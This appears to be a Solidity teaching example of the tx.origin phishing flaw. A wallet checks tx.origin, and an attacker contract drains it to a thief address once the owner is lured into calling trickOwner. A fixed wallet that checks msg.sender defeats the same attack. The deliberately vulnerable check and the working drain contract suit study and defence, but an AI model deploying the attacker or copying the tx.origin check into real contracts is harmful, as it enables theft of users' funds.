// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableTxOriginWallet {
    address public immutable OWNER;

    constructor(address walletOwner) payable {
        OWNER = walletOwner;
    }

    receive() external payable {}

    function transferAll(address payable recipient) external {
        require(tx.origin == OWNER, "not owner origin");

        (bool success,) = recipient.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }
}

contract TxOriginPhishingAttacker {
    VulnerableTxOriginWallet public immutable TARGET;
    address payable public immutable THIEF;

    constructor(address payable targetAddress, address payable thiefAddress) {
        TARGET = VulnerableTxOriginWallet(targetAddress);
        THIEF = thiefAddress;
    }

    function trickOwner() external {
        TARGET.transferAll(THIEF);
    }
}

contract FixedMsgSenderWallet {
    address public immutable OWNER;

    constructor(address walletOwner) payable {
        OWNER = walletOwner;
    }

    receive() external payable {}

    function transferAll(address payable recipient) external {
        require(msg.sender == OWNER, "not owner sender");

        (bool success,) = recipient.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }
}

contract FailedTxOriginPhishingAttacker {
    FixedMsgSenderWallet public immutable TARGET;
    address payable public immutable THIEF;

    constructor(address payable targetAddress, address payable thiefAddress) {
        TARGET = FixedMsgSenderWallet(targetAddress);
        THIEF = thiefAddress;
    }

    function trickOwner() external {
        TARGET.transferAll(THIEF);
    }
}
